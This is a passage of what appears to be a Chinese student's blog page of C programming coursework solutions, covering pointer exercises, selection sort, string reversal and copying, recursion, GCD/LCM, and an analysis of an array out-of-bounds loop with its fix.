<figure class="highlight cpp"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;string.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">int</span> <span class="title">main</span><span class="params">()</span> </span>&#123;</span><br><span class="line">    <span class="type">int</span> n;</span><br><span class="line">    <span class="type">char</span> c[<span class="number">100</span>][<span class="number">100</span>]; </span><br><span class="line">    <span class="type">char</span> t[<span class="number">100</span>];</span><br><span class="line">    <span class="built_in">scanf</span>(<span class="string">&quot;%d&quot;</span>, &amp;n);</span><br><span class="line">    <span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">0</span>; i &lt; n; i++) &#123;</span><br><span class="line">        <span class="built_in">scanf</span>(<span class="string">&quot;%s&quot;</span>, c[i]);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">0</span>; i &lt; n - <span class="number">1</span>; i++) &#123;</span><br><span class="line">        <span class="keyword">for</span> (<span class="type">int</span> j = <span class="number">0</span>; j &lt; n - i - <span class="number">1</span>; j++) &#123;</span><br><span class="line">            <span class="keyword">if</span> (<span class="built_in">strcmp</span>(c[j], c[j + <span class="number">1</span>]) &gt; <span class="number">0</span>) &#123; </span><br><span class="line">                <span class="built_in">strcpy</span>(t, c[j]);</span><br><span class="line">                <span class="built_in">strcpy</span>(c[j], c[j + <span class="number">1</span>]);</span><br><span class="line">                <span class="built_in">strcpy</span>(c[j + <span class="number">1</span>], t);</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">0</span>; i &lt; n; i++) &#123;</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;%s&quot;</span>, c[i]);</span><br><span class="line">        <span class="keyword">if</span> (i &lt; n - <span class="number">1</span>) &#123;</span><br><span class="line">            <span class="built_in">printf</span>(<span class="string">&quot; &quot;</span>);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<h1 id="实验四24.11.22">实验四（24.11.22）</h1>
<ol type="1">
<li><p>sy4-1</p>
<p>打开C集成开发环境，建立一个sy4-1.cpp文件，编写一程序，输入三个整数a、b、c，并定义三个指针变量pa、pb、pc分别引用它们，并按降序输出，输出时数据间用一个空格隔开。例如：</p></li>
</ol>
<p>输入：1 3 5，输出：5 3 1</p>
<p>输入：50 34 65，输出：65 50 34</p>
<figure class="highlight perl"><table><tr><td class="code"><pre><span class="line"><span class="comment">#include &lt;stdio.h&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">int</span> main() &#123;</span><br><span class="line">    <span class="keyword">int</span> a, b, c;</span><br><span class="line">    <span class="keyword">int</span> *pa = &amp;a, *pb = &amp;b, *pc = &amp;c;</span><br><span class="line">    scanf(<span class="string">&quot;<span class="variable">%d</span> <span class="variable">%d</span> <span class="variable">%d</span>&quot;</span>, pa, pb, pc);</span><br><span class="line">    <span class="keyword">if</span> (*pa &lt; *pb) &#123;</span><br><span class="line">        <span class="keyword">int</span> temp = *pa;</span><br><span class="line">        *pa = *pb;</span><br><span class="line">        *pb = temp;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span> (*pa &lt; *pc) &#123;</span><br><span class="line">        <span class="keyword">int</span> temp = *pa;</span><br><span class="line">        *pa = *pc;</span><br><span class="line">        *pc = temp;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span> (*pb &lt; *pc) &#123;</span><br><span class="line">        <span class="keyword">int</span> temp = *pb;</span><br><span class="line">        *pb = *pc;</span><br><span class="line">        *pc = temp;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">printf</span>(<span class="string">&quot;<span class="variable">%d</span> <span class="variable">%d</span> <span class="variable">%d</span>&quot;</span>, *pa, *pb, *pc);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<ol start="2" type="1">
<li><p>sy4-2</p>
<p>打开C集成开发环境，建立一个sy4-2.cpp文件，编写一程序，输入n个成绩，然后使用指针变量p输出高于平均值的各个成绩，输出时成绩保留1位小数，成绩间用一个空格隔开。例如：</p></li>
</ol>
<p>输入：5 76 87 67 90 60，输出：87.0 90.0</p>
<p>输入：10 67 87 99 76 70 87 64 45 89 80，输出：87.0 99.0 87.0 89.0
80.0</p>
<p>注：输入的第1个数为成绩个数。</p>
<figure class="highlight cpp"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">int</span> <span class="title">main</span><span class="params">()</span> </span>&#123;</span><br><span class="line">    <span class="type">int</span> n;</span><br><span class="line">    <span class="built_in">scanf</span>(<span class="string">&quot;%d&quot;</span>, &amp;n);</span><br><span class="line">    <span class="type">float</span> scores[n], sum = <span class="number">0.0</span>, avg; </span><br><span class="line">    <span class="type">float</span> *p = scores;             </span><br><span class="line"></span><br><span class="line">    <span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">0</span>; i &lt; n; i++) &#123;</span><br><span class="line">        <span class="built_in">scanf</span>(<span class="string">&quot;%f&quot;</span>, p + i);</span><br><span class="line">        sum += *(p + i); </span><br><span class="line">    &#125;</span><br><span class="line">    avg = sum / n;  </span><br><span class="line">    <span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">0</span>; i &lt; n; i++) &#123;</span><br><span class="line">        <span class="keyword">if</span> (*(p + i) &gt; avg) &#123;</span><br><span class="line">            <span class="built_in">printf</span>(<span class="string">&quot;%.1f &quot;</span>, *(p + i));</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<ol start="3" type="1">
<li><p>sy4-3</p>
<p>打开C集成开发环境，建立一个sy4-3.cpp文件，编写一程序，首先定义一个容量15的数组（如：int
a[15]），输入n（n&lt;15）个数，然后使用选择法对这n个进行升序排序后输出；再输入一个数并插入到已排好序的数组中并保持有序，最后输出这n+1个数。输出时每个数据间用一个空格隔开。例如：</p></li>
</ol>
<p>输入：5</p>
<p>4 5 2 9 3</p>
<p>第1次输出：2 3 4 5 9</p>
<p>再输入：6</p>
<p>第2次输出：2 3 4 5 6 9</p>
<figure class="highlight cpp"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">int</span> <span class="title">main</span><span class="params">()</span> </span>&#123;</span><br><span class="line">    <span class="type">int</span> n, value, a[<span class="number">15</span>];</span><br><span class="line"></span><br><span class="line">    <span class="built_in">scanf</span>(<span class="string">&quot;%d&quot;</span>, &amp;n);</span><br><span class="line">    <span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">0</span>; i &lt; n; i++) &#123;</span><br><span class="line">        <span class="built_in">scanf</span>(<span class="string">&quot;%d&quot;</span>, &amp;a[i]);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">0</span>; i &lt; n - <span class="number">1</span>; i++) &#123;</span><br><span class="line">        <span class="keyword">for</span> (<span class="type">int</span> j = i + <span class="number">1</span>; j &lt; n; j++) &#123;</span><br><span class="line">            <span class="keyword">if</span> (a[j] &lt; a[i]) &#123;</span><br><span class="line">                <span class="type">int</span> temp = a[i];</span><br><span class="line">                a[i] = a[j];</span><br><span class="line">                a[j] = temp;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">0</span>; i &lt; n; i++) &#123;</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;%d &quot;</span>, a[i]);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;\n&quot;</span>);</span><br><span class="line"></span><br><span class="line">    <span class="built_in">scanf</span>(<span class="string">&quot;%d&quot;</span>, &amp;value);</span><br><span class="line">    <span class="type">int</span> i = n - <span class="number">1</span>;</span><br><span class="line">    <span class="keyword">while</span> (i &gt;= <span class="number">0</span> &amp;&amp; a[i] &gt; value) &#123;</span><br><span class="line">        a[i + <span class="number">1</span>] = a[i];</span><br><span class="line">        i--;</span><br><span class="line">    &#125;</span><br><span class="line">    a[i + <span class="number">1</span>] = value;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">0</span>; i &lt; n + <span class="number">1</span>; i++) &#123;</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;%d &quot;</span>, a[i]);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;\n&quot;</span>);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>4.sy4-4</p>
<p>打开C集成开发环境，建立一个sy4-4.cpp文件，编写一程序，输入以下4×4矩阵，并将其转置，即行列互换，然后使用指向一维数组的指针变量（int
(*q)[4]）输出转置后的矩阵。输出时每个数据间用一个空格隔开。例如：</p>
<p>​ 转置后</p>
<figure class="highlight perl"><table><tr><td class="code"><pre><span class="line"><span class="comment">#include &lt;stdio.h&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">int</span> main() &#123;</span><br><span class="line">    <span class="keyword">int</span> a[<span class="number">4</span>][<span class="number">4</span>], b[<span class="number">4</span>][<span class="number">4</span>];</span><br><span class="line">    <span class="keyword">int</span> (*<span class="keyword">q</span>)[<span class="number">4</span>] = b;  </span><br><span class="line">    <span class="keyword">for</span> (<span class="keyword">int</span> i = <span class="number">0</span>; i &lt; <span class="number">4</span>; i++) &#123;</span><br><span class="line">        <span class="keyword">for</span> (<span class="keyword">int</span> j = <span class="number">0</span>; j &lt; <span class="number">4</span>; j++) &#123;</span><br><span class="line">            scanf(<span class="string">&quot;<span class="variable">%d</span>&quot;</span>, &amp;a[i][j]);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">for</span> (<span class="keyword">int</span> i = <span class="number">0</span>; i &lt; <span class="number">4</span>; i++) &#123;</span><br><span class="line">        <span class="keyword">for</span> (<span class="keyword">int</span> j = <span class="number">0</span>; j &lt; <span class="number">4</span>; j++) &#123;</span><br><span class="line">            b[j][i] = a[i][j];</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">for</span> (<span class="keyword">int</span> i = <span class="number">0</span>; i &lt; <span class="number">4</span>; i++) &#123;</span><br><span class="line">        <span class="keyword">for</span> (<span class="keyword">int</span> j = <span class="number">0</span>; j &lt; <span class="number">4</span>; j++) &#123;</span><br><span class="line">            <span class="keyword">printf</span>(<span class="string">&quot;<span class="variable">%d</span> &quot;</span>, *(<span class="string">q[i]</span> + j)); </span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">printf</span>(<span class="string">&quot;\n&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<ol start="5" type="1">
<li><p>sy4-5</p>
<p>打开C集成开发环境，建立一个sy4-5.cpp文件，输入如下程序代码，编译运行。</p></li>
</ol>
<p>#include &lt;stdio.h&gt;</p>
<p>int main()</p>
<p>{</p>
<p>​ int i=0;</p>
<p>​ int a[]={1,2,3,4,5,6,7,8,9,10};</p>
<p>​ for(i=0;i&lt;=10;i++)</p>
<p>​ {</p>
<p>​ a[i]=0;</p>
<p>​ printf(“Hello World!”);</p>
<p>​ }</p>
<p>​ return 0;</p>
<p>}</p>
<p>试分析以上程序可能存在的问题，为什么，以后应如何避免出现类似的问题。</p>
<p><strong>数组越界访问</strong>：</p>
<ul>
<li>数组 <code>a[]</code> 被定义为包含 10 个元素（从索引 <code>0</code>
到 <code>9</code>），即它的有效索引范围是 <code>0</code> 到
<code>9</code>。</li>
<li><code>for(i = 0; i &lt;= 10; i++)</code> 中的循环条件会导致
<code>i</code> 在最后一次迭代时取值为
<code>10</code>，这是一个越界的索引，因为数组 <code>a[]</code> 只有索引
<code>0</code> 到 <code>9</code>。</li>
<li>当 <code>i = 10</code> 时，<code>a[i] = 0</code> 会访问数组
<code>a</code> 中不存在的第 11
个元素（越界），并可能导致未定义行为，如程序崩溃或内存损坏。</li>
</ul>
<p><strong>循环次数过多</strong>：</p>
<ul>
<li><p>循环应该在 <code>i = 9</code> 时停止，而不是
<code>i = 10</code>。这是因为数组 <code>a[]</code> 只有 10
个元素，索引的最大值是 <code>9</code>。</p>
<p>修改后</p>
<figure class="highlight cpp"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">int</span> <span class="title">main</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="type">int</span> i = <span class="number">0</span>;</span><br><span class="line">    <span class="type">int</span> a[] = &#123;<span class="number">1</span>, <span class="number">2</span>, <span class="number">3</span>, <span class="number">4</span>, <span class="number">5</span>, <span class="number">6</span>, <span class="number">7</span>, <span class="number">8</span>, <span class="number">9</span>, <span class="number">10</span>&#125;;</span><br><span class="line">    </span><br><span class="line">    <span class="keyword">for</span>(i = <span class="number">0</span>; i &lt; <span class="number">10</span>; i++)  <span class="comment">// 改为 i &lt; 10</span></span><br><span class="line">    &#123;</span><br><span class="line">        a[i] = <span class="number">0</span>;</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;Hello World!\n&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></li>
</ul>
<h1 id="编程作业七24.11.26">编程作业七（24.11.26）</h1>
<h2 id="程序文件名zy8-1.cpp">1、【程序文件名】zy8-1.cpp</h2>
<p>【题目描述】编写两个函数comm_div和comm_mul，分别求两个整数的最大公约数和最小公
倍数，在main函数中输入两个整数，调用这两个函数并输出两个整数的最大公约数和最小
公倍数，输出时两数间用一个空格隔开。例如： 输入：48 64，输出：16 192
输入：45 88，输出：1 3960</p>
<figure class="highlight cpp"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">int</span> <span class="title">comm_div</span><span class="params">(<span class="type">int</span> a, <span class="type">int</span> b)</span> </span>&#123;</span><br><span class="line">    <span class="keyword">while</span> (b != <span class="number">0</span>) &#123;</span><br><span class="line">        <span class="type">int</span> temp = a % b;</span><br><span class="line">        a = b;</span><br><span class="line">        b = temp;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> a;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">int</span> <span class="title">comm_mul</span><span class="params">(<span class="type">int</span> a, <span class="type">int</span> b)</span> </span>&#123;</span><br><span class="line">    <span class="keyword">return</span> (a * b) / <span class="built_in">comm_div</span>(a, b);  </span><br><span class="line">&#125; </span><br><span class="line"><span class="function"><span class="type">int</span> <span class="title">main</span><span class="params">()</span> </span>&#123;</span><br><span class="line">    <span class="type">int</span> a, b;</span><br><span class="line">    <span class="built_in">scanf</span>(<span class="string">&quot;%d %d&quot;</span>, &amp;a, &amp;b); </span><br><span class="line">    <span class="type">int</span> gcd = <span class="built_in">comm_div</span>(a, b); </span><br><span class="line">    <span class="type">int</span> lcm = <span class="built_in">comm_mul</span>(a, b); </span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;%d %d\n&quot;</span>, gcd, lcm); </span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<h2 id="程序文件名zy8-2.cpp">2、【程序文件名】zy8-2.cpp</h2>
<p>【题目描述】编写一个从小到大排序（选择法）的函数sort(int x[],int
n)，其中n为整
数个数。在main函数中输入n的值和一n个整数，调用排序函数sort后，输出排序后的n
个整数，每个数间用一个空格隔开。例如： 输入：5 7 2 1 8 4 输出：1 2 4 7 8
输入：10 67 56 45 89 34 21 87 32 89 12 输出：12 21 32 34 45 56 67 87 89
89</p>
<figure class="highlight cpp"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">void</span> <span class="title">sort</span><span class="params">(<span class="type">int</span> x[], <span class="type">int</span> n)</span> </span>&#123;</span><br><span class="line">    <span class="type">int</span> i, j, temp, min_index;</span><br><span class="line">    <span class="keyword">for</span> (i = <span class="number">0</span>; i &lt; n - <span class="number">1</span>; i++) &#123;</span><br><span class="line">        min_index = i;</span><br><span class="line">        <span class="keyword">for</span> (j = i + <span class="number">1</span>; j &lt; n; j++) &#123;</span><br><span class="line">            <span class="keyword">if</span> (x[j] &lt; x[min_index]) &#123;</span><br><span class="line">                min_index = j;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">if</span> (min_index != i) &#123;</span><br><span class="line">            temp = x[i];</span><br><span class="line">            x[i] = x[min_index];</span><br><span class="line">            x[min_index] = temp;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">int</span> <span class="title">main</span><span class="params">()</span> </span>&#123;</span><br><span class="line">    <span class="type">int</span> n, i;</span><br><span class="line">    <span class="built_in">scanf</span>(<span class="string">&quot;%d&quot;</span>, &amp;n);</span><br><span class="line">    <span class="type">int</span> x[n]; </span><br><span class="line">    <span class="keyword">for</span> (i = <span class="number">0</span>; i &lt; n; i++) &#123;</span><br><span class="line">        <span class="built_in">scanf</span>(<span class="string">&quot;%d&quot;</span>, &amp;x[i]);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="built_in">sort</span>(x, n);</span><br><span class="line">    <span class="keyword">for</span> (i = <span class="number">0</span>; i &lt; n; i++) &#123;</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;%d&quot;</span>, x[i]);</span><br><span class="line">        <span class="keyword">if</span> (i &lt; n - <span class="number">1</span>) &#123;</span><br><span class="line">            <span class="built_in">printf</span>(<span class="string">&quot; &quot;</span>); </span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<h2 id="程序文件名zy8-3.cpp">3、【程序文件名】zy8-3.cpp</h2>
<p>【题目描述】编写一函数str_reverse(char
c[])，功能是将一个字符串逆序存放，在main
函数中输入一个字符串，调用str_reverse函数后，输出该字符串。例如：
输入：abcd，输出：dcba 输入：12345，输出：54321</p>
<figure class="highlight cpp"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;string.h&gt;</span> </span></span><br><span class="line"><span class="function"><span class="type">void</span> <span class="title">str_reverse</span><span class="params">(<span class="type">char</span> c[])</span> </span>&#123;</span><br><span class="line">    <span class="type">int</span> len = <span class="built_in">strlen</span>(c);</span><br><span class="line">    <span class="type">int</span> i;</span><br><span class="line">    <span class="keyword">for</span> (i = <span class="number">0</span>; i &lt; len / <span class="number">2</span>; i++) &#123;</span><br><span class="line">        <span class="type">char</span> temp = c[i];</span><br><span class="line">        c[i] = c[len - i - <span class="number">1</span>];</span><br><span class="line">        c[len - i - <span class="number">1</span>] = temp;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="type">int</span> <span class="title">main</span><span class="params">()</span> </span>&#123;</span><br><span class="line">    <span class="type">char</span> str[<span class="number">100</span>]; </span><br><span class="line">    <span class="built_in">scanf</span>(<span class="string">&quot;%s&quot;</span>, str);</span><br><span class="line">    <span class="built_in">str_reverse</span>(str);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;%s&quot;</span>, str);</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<h1 id="作业924.11.30">作业9（24.11.30）</h1>
<h2 id="程序文件名zy9-1.cpp">1、【程序文件名】zy9-1.cpp</h2>
<p>【题目描述】编写一个函数int add(int
n)，使用递归算法求1+2+3+…+n，在main函数中
输入n，调用add函数后并输出计算结果。例如： 输入：10，输出：55
输出：100，输出：5050</p>
<figure class="highlight cpp"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">int</span> <span class="title">add</span><span class="params">(<span class="type">int</span> n)</span> </span>&#123;</span><br><span class="line">    <span class="keyword">if</span> (n == <span class="number">1</span>)  </span><br><span class="line">        <span class="keyword">return</span> <span class="number">1</span>;</span><br><span class="line">    <span class="keyword">return</span> n + <span class="built_in">add</span>(n - <span class="number">1</span>);  </span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">int</span> <span class="title">main</span><span class="params">()</span> </span>&#123;</span><br><span class="line">    <span class="type">int</span> n;</span><br><span class="line">    <span class="built_in">scanf</span>(<span class="string">&quot;%d&quot;</span>, &amp;n);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;%d&quot;</span>, <span class="built_in">add</span>(n)); </span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<h2 id="程序文件名zy9-2.cpp">2、【程序文件名】zy9-2.cpp</h2>
<p>【题目描述】编写一个函数void string_copy(char <em>f,char
</em>t)，功能是将 f字符串得到t中（不 得使用strcpy函数），在
main函数中定义两个字符数组char x[100], y[100]，输入x字符串，
调用string_copy 函数将 x字符串复制到y中，输出y字符串。例如：
输入：12345，输出：12345 输入：abcde，输出：abcde *</p>
<figure class="highlight cpp"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="function"><span class="type">void</span> <span class="title">string_copy</span><span class="params">(<span class="type">char</span> *f, <span class="type">char</span> *t)</span> </span>&#123;</span><br><span class="line">    <span class="keyword">while</span> (*f != <span class="string">&#x27;\0&#x27;</span>) &#123; </span><br><span class="line">        *t = *f;          </span><br><span class="line">        f++;             </span><br><span class="line">        t++;             </span><br><span class="line">    &#125;</span><br><span class="line">    *t = <span class="string">&#x27;\0&#x27;</span>;           </span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="type">int</span> <span class="title">main</span><span class="params">()</span> </span>&#123;</span><br><span class="line">    <span class="type">char</span> x[<span class="number">100</span>], y[<span class="number">100</span>];   </span><br><span class="line">    <span class="built_in">scanf</span>(<span class="string">&quot;%s&quot;</span>, x);     </span><br><span class="line">    <span class="built_in">string_copy</span>(x, y);    </span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;%s&quot;</span>, y);</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<h2 id="程序文件名zy9-3.cpp">3、【程序文件名】zy9-3.cpp</h2>
<p>【题目描述】编写一个从小到大排序（选择法）函数void sort(char
(*p)[10],int n)，其中n为
整数个数。在main函数中输入n并输入n个国家英文名称，调用排序函数后输出。例如：
输入：5 China France Britain Russia America 输出：America Britain China
France Russia</p>
<figure class="highlight cpp"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;string.h&gt;</span></span></span><br><span class="line"><span class="function"><span class="type">void</span> <span class="title">sort</span><span class="params">(<span class="type">char</span> (*p)[<span class="number">10</span>], <span class="type">int</span> n)</span> </span>&#123;</span><br><span class="line">    <span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">0</span>; i &lt; n - <span class="number">1</span>; i++) &#123;</span><br><span class="line">        <span class="type">int</span> minIndex = i; </span><br><span class="line">        <span class="keyword">for</span> (<span class="type">int</span> j = i + <span class="number">1</span>; j &lt; n; j++) &#123;</span><br><span class="line">            <span class="keyword">if</span> (<span class="built_in">strcmp</span>(p[j], p[minIndex]) &lt; <span class="number">0</span>) &#123;</span><br><span class="line">                minIndex = j;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">if</span> (minIndex != i) &#123;</span><br><span class="line">            <span class="type">char</span> temp[<span class="number">10</span>];</span><br><span class="line">            <span class="built_in">strcpy</span>(temp, p[i]);</span><br><span class="line">            <span class="built_in">strcpy</span>(p[i], p[minIndex]);</span><br><span class="line">            <span class="built_in">strcpy</span>(p[minIndex], temp);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">int</span> <span class="title">main</span><span class="params">()</span> </span>&#123;</span><br><span class="line">    <span class="type">int</span> n;</span><br><span class="line">    <span class="built_in">scanf</span>(<span class="string">&quot;%d&quot;</span>, &amp;n);</span><br><span class="line">    <span class="type">char</span> countries[n][<span class="number">10</span>];</span><br><span class="line">    <span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">0</span>; i &lt; n; i++) &#123;</span><br><span class="line">        <span class="built_in">scanf</span>(<span class="string">&quot;%s&quot;</span>, countries[i]);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="built_in">sort</span>(countries, n);</span><br><span class="line">    <span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">0</span>; i &lt; n; i++) &#123;</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;%s &quot;</span>, countries[i]);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<h1 id="实验五24.11.30">实验五（24.11.30）</h1>
<h2 id="sy5-1">1.sy5-1</h2>
<p>打开C集成开发环境，建立一个sy5-1.cpp文件，编写一程序，功能是输入一个字符串，输出字符串的长度，不能使用strlen函数。例如：</p>
<p>输入：abcd123，输出：7</p>
<p>输入：!@#$ABC123，输出：10</p>
<figure class="highlight hsp"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> &lt;stdio.h&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">int</span> main() &#123;</span><br><span class="line">    char <span class="keyword">str</span>[<span class="number">100</span>]<span class="comment">;</span></span><br><span class="line">    <span class="keyword">int</span> <span class="keyword">length</span> = <span class="number">0</span><span class="comment">;</span></span><br><span class="line">    scanf(<span class="string">&quot;%s&quot;</span>, <span class="keyword">str</span>)<span class="comment">; </span></span><br><span class="line">    <span class="keyword">while</span> (<span class="keyword">str</span>[<span class="keyword">length</span>] != <span class="string">&#x27;\0&#x27;</span>) &#123;</span><br><span class="line">        <span class="keyword">length</span>++<span class="comment">;</span></span><br><span class="line">    &#125;</span><br><span class="line">    printf(<span class="string">&quot;%d&quot;</span>, <span class="keyword">length</span>)<span class="comment">;</span></span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span><span class="comment">;</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<h2 id="sy5-2">2.sy5-2</h2>
<p>打开C集成开发环境，建立一个sy5-2.cpp文件，编写一程序，功能是输入一个字符串，分别统计大写字母、小写字母、数字和其它字符的个数，并输出各类字符的个数，数字间用一个空格隔开。例如：</p>
<p>输入：!@#$ ABC abc 123，输出：3 3 3 7</p>
<p>输入：&amp;*AbdEF12G4，输出：4 2 3 2</p>
<figure class="highlight axapta"><table><tr><td class="code"><pre><span class="line"><span class="meta">#include &lt;stdio.h&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="built_in">int</span> main() &#123;</span><br><span class="line">    <span class="built_in">char</span> <span class="built_in">str</span>[<span class="number">100</span>];</span><br><span class="line">    <span class="built_in">int</span> uppercase = <span class="number">0</span>, lowercase = <span class="number">0</span>, digits = <span class="number">0</span>, others = <span class="number">0</span>;</span><br><span class="line">    fgets(<span class="built_in">str</span>, sizeof(<span class="built_in">str</span>), stdin);</span><br><span class="line">    <span class="keyword">for</span> (<span class="built_in">int</span> i = <span class="number">0</span>; <span class="built_in">str</span>[i] != <span class="string">&#x27;\0&#x27;</span>; i++) &#123;</span><br><span class="line">        <span class="keyword">if</span> (<span class="built_in">str</span>[i] &gt;= <span class="string">&#x27;A&#x27;</span> &amp;&amp; <span class="built_in">str</span>[i] &lt;= <span class="string">&#x27;Z&#x27;</span>) &#123;</span><br><span class="line">            uppercase++;</span><br><span class="line">        &#125; <span class="keyword">else</span> <span class="keyword">if</span> (<span class="built_in">str</span>[i] &gt;= <span class="string">&#x27;a&#x27;</span> &amp;&amp; <span class="built_in">str</span>[i] 